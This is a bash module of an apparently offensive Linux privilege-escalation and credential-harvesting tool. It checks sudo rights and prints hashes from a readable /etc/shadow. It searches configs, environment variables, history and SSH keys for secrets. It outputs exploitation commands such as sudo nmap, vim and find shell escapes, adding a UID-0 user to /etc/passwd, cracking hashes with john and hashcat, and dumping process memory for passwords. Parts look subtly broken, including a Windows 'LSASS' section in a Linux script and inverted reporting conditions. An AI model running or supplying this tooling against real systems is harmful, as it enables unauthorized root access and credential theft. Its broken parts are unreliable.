#!/bin/bash

source "$(dirname "${BASH_SOURCE[0]}")/../utils/helpers.sh"

check_sudo_l() {
    print_title "SUDO -L PRIVILEGES"
    
    if check_tool "sudo"; then
        print_info "Checking sudo privileges..."
        
        local sudo_l_output=$(sudo -l 2>/dev/null)
        
        if echo "$sudo_l_output" | grep -q "may run the following commands"; then
            print_good "User has sudo privileges!"
            echo "$sudo_l_output" | grep -v "may run" | head -30
            
            echo ""
            print_subtitle "Dangerous sudo permissions:"
            
            if echo "$sudo_l_output" | grep -qiE "(nmap|vim|vi|find|bash|sh|perl|python|ruby|make|git|hg|svn|zip|tar|gzip|bzip2|dd)"; then
                print_high "Dangerous commands available via sudo!"
                
                [[ "$OUTPUT_FORMAT" != "json" ]] && json_add_finding "sudo" "high" "Dangerous sudo privileges" "User can run dangerous commands as root" "N/A"
                
                print_command "# If you have sudo nmap"
                print_command "sudo nmap --interactive"
                print_command "nmap> !sh"
                print ""
                
                print_command "# If you have sudo vim"
                print_command "sudo vim -c ':!sh'"
                print ""
                
                print_command "# If you have sudo find"
                print_command "sudo find . -exec /bin/sh \; -quit"
                print ""
            fi
            
            if echo "$sudo_l_output" | grep -qi "(ALL : ALL)"; then
                print_critical "User can run ALL commands as ALL users!"
                [[ "$OUTPUT_FORMAT" != "json" ]] && json_add_finding "sudo" "critical" "Full sudo access" "User can run any command as any user" "N/A"
            fi
            
            if echo "$sudo_l_output" | grep -qi "(ALL)"; then
                print_high "User can run commands as other users"
            fi
            
            if echo "$sudo_l_output" | grep -qi "NOPASSWD"; then
                print_critical "NOPASSWD: User can run commands without password!"
                [[ "$OUTPUT_FORMAT" != "json" ]] && json_add_finding "sudo" "critical" "Passwordless sudo" "User can run commands without password" "N/A"
            fi
        else
            print_warn "User does not have sudo privileges or sudo is not configured"
        fi
        
        print_subtitle "Secure path in sudoers:"
        local secure_path=$(echo "$sudo_l_output" | grep -o "secure_path=[^,]*" | head -1)
        if [[ -n "$secure_path" ]]; then
            print_info "Secure path: $secure_path"
        fi
    else
        print_warn "sudo command not found"
    fi
    
    echo ""
}

check_passwd_file() {
    print_title "/ETC/PASSWD FILE ANALYSIS"
    
    print_info "Checking for users with UID 0 (root):"
    local root_users=$(get_passwd_file | awk -F: '($3 == 0) {print}')
    
    if [[ -n "$root_users" ]]; then
        print_critical "Users with UID 0 (root):"
        echo "$root_users"
        
        [[ "$OUTPUT_FORMAT" != "json" ]] && json_add_finding "passwd" "critical" "Multiple UID 0 users" "$root_users" "N/A"
    else
        print_good "Only root has UID 0"
    fi
    
    echo ""
    
    print_info "Users with shell access:"
    get_passwd_file | awk -F: '($7 != "/usr/sbin/nologin" && $7 != "/sbin/nologin" && $7 != "/bin/false") {print $1 ":" $3 ":" $7}' | head -20
    
    echo ""
    
    print_subtitle "Add new root user:"
    print_command "# If /etc/passwd is writable"
    print_command "echo 'root2:\$1\$salt\$hash:0:0:root:/root:/bin/bash' >> /etc/passwd"
    print_command "su root2"
    
    echo ""
}

check_shadow_file() {
    print_title "/ETC/SHADOW FILE"
    
    if [[ -r /etc/shadow ]]; then
        print_critical "/etc/shadow is READABLE!"
        
        [[ "$OUTPUT_FORMAT" != "json" ]] && json_add_finding "shadow" "critical" "/etc/shadow readable" "Can extract password hashes" "N/A"
        
        print_info "Password hashes (first 5):"
        get_shadow_file | head -5 | awk -F: '{print $1 ": " $2}'
        
        print_subtitle "Crack passwords:"
        print_command "unshadow /etc/passwd /etc/shadow > hashes.txt"
        print_command "john hashes.txt"
        print_command "hashcat -m 1800 hashes.txt wordlist.txt"
    else
        print_good "/etc/shadow is not readable (normal)"
    fi
    
    echo ""
}

search_passwords_files() {
    print_title "PASSWORD HUNTING"
    
    print_info "Searching for password patterns in common locations..."
    
    print_subtitle "In environment variables:"
    get_env_vars
    
    echo ""
    
    print_subtitle "In configuration files:"
    local config_paths="/etc /var/www /opt /usr/local/etc /home"
    
    for path in $config_paths; do
        if [[ -d "$path" ]]; then
            timeout_command "grep -rnIiE '(password|passwd|pwd|secret|token|api_key|db_pass).*[=:].+' $path 2>/dev/null | head -10" 10
        fi
    done
    
    echo ""
    
    print_subtitle "In history files:"
    get_shell_history 2>/dev/null | grep -iE "(password|passwd|secret|su |mysql|psql|ssh)" | head -20
    
    echo ""
}

check_ssh_keys() {
    print_title "SSH KEYS"
    
    print_info "Searching for SSH keys..."
    
    local ssh_keys=$(search_ssh_keys)
    
    if [[ -n "$ssh_keys" ]]; then
        print_high "SSH keys found!"
        echo "$ssh_keys"
        
        [[ "$OUTPUT_FORMAT" != "json" ]] && json_add_finding "ssh" "high" "SSH keys found" "$ssh_keys" "Use for SSH access"
    else
        print_info "No SSH keys found in common locations"
    fi
    
    print_subtitle "SSH key exploitation:"
    print_command "# If you found a private key"
    print_command "chmod 600 id_rsa"
    print_command "ssh -i id_rsa user@target"
    print ""
    
    print_subtitle "Authorized keys:"
    print_command "# Check for authorized_keys that allow access"
    print_command "cat ~/.ssh/authorized_keys 2>/dev/null"
    print_command "cat /root/.ssh/authorized_keys 2>/dev/null"
    print ""
    
    echo ""
}

check_database_configs() {
    print_title "DATABASE CONFIGURATIONS"
    
    print_info "Searching for database connection files..."
    
    local db_files=$(find /etc /var/www /opt -name "*.cnf" -o -name "*.conf" -o -name "*.cfg" 2>/dev/null | xargs grep -l "password\|host\|database" 2>/dev/null | head -10)
    
    if [[ -n "$db_files" ]]; then
        print_info "Files with database credentials:"
        echo "$db_files"
    fi
    
    print_subtitle "MySQL/MariaDB:"
    check_mysql_access
    
    print_subtitle "PostgreSQL:"
    check_pg_access
    
    print_subtitle "Database file locations:"
    print_command "find /var/lib -name \"*.frm\" -o -name \"*.myd\" -o -name \"*.ibd\" 2>/dev/null | head -10"
    print_command "find /var/lib/mysql -name \"*.frm\" 2>/dev/null | head -10"
    print_command "find /var/lib/postgresql -name \"*.sql\" 2>/dev/null | head -10"
    
    echo ""
}

check_backup_files() {
    print_title "BACKUP FILES"
    
    print_info "Searching for backup and old files..."
    
    print_subtitle "In /etc:"
    find /etc -name "*.bak" -o -name "*.backup" -o -name "*.old" -o -name "*.save" -o -name "*.orig" 2>/dev/null | head -20
    
    print_subtitle "In user directories:"
    find /home -name "*.bak" -o -name "*.backup" -o -name "*.old" 2>/dev/null | head -20
    
    print_subtitle "In /var/www:"
    find /var/www -name "*.bak" -o -name "*.backup" -o -name "*.swp" -o -name "*.swo" 2>/dev/null | head -20
    
    echo ""
}

check_credentials_in_memory() {
    print_title "CREDENTIALS IN MEMORY"
    
    print_info "Searching for credentials in process memory..."
    
    if [[ -n "$STRACE_CMD" ]]; then
        print_command "# Trace processes for sensitive data"
        print_command "strace -p <PID> -e trace=read -f 2>&1 | grep password"
    fi
    
    print_subtitle "LSASS process:"
    if [[ -r "/proc/1/mem" ]]; then
        print_command "# If you have ptrace access"
        print_command "gdb -p <lsass_pid> -ex 'dump memory mem.bin' -q"
        print_command "strings mem.bin | grep password"
    fi
    
    echo ""
}

run_credential_checks() {
    check_sudo_l
    check_passwd_file
    check_shadow_file
    search_passwords_files
    check_ssh_keys
    check_database_configs
    check_backup_files
    check_credentials_in_memory
}
